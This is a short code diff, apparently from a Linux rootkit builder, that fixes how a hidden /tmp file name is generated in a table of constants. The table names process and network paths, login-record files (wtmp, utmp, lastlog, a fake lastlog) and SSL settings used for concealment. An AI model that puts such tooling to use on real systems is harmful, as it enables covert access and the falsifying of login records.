@@ -182,7 +182,7 @@ proc_vals = [PROC_NET_TCP, PROC_NET_TCP6,
              "/proc/", "/proc/%s"]
 
 cc_consts = ["ENV_LINE", "CMD_LINE", "CMDLINE_SELF", "BASH", "_WTMP_FILE", "_UTMP_FILE", "LASTLOG", "FAKE_LASTLOG_FILE"]
-cc_vals = ["%s/environ", "%s/cmdline", "/proc/self/cmdline", "/bin/bash --login", "/var/log/wtmp", "/var/run/utmp", "/var/log/lastlog", "/tmp/.".join(random.choice(string.digits))]
+cc_vals = ["%s/environ", "%s/cmdline", "/proc/self/cmdline", "/bin/bash --login", "/var/log/wtmp", "/var/run/utmp", "/var/log/lastlog", "/tmp/." + "".join(random.choice(string.digits))]
 
 ssl_consts = ["SSL_CIPHER_LIST", "SUBJECT_ALT_NAME", "NS_COMMENT", "COMMON_NAME", "COMMON_NAME_HOST", "DNS",
               "DEFAULT_KEY_BITS", "DEFAULT_CERT_DURATION", "CERTIFICATE_COMMENT", "DEFAULT_TCP_BUF_LEN", "MAX_LEN"]
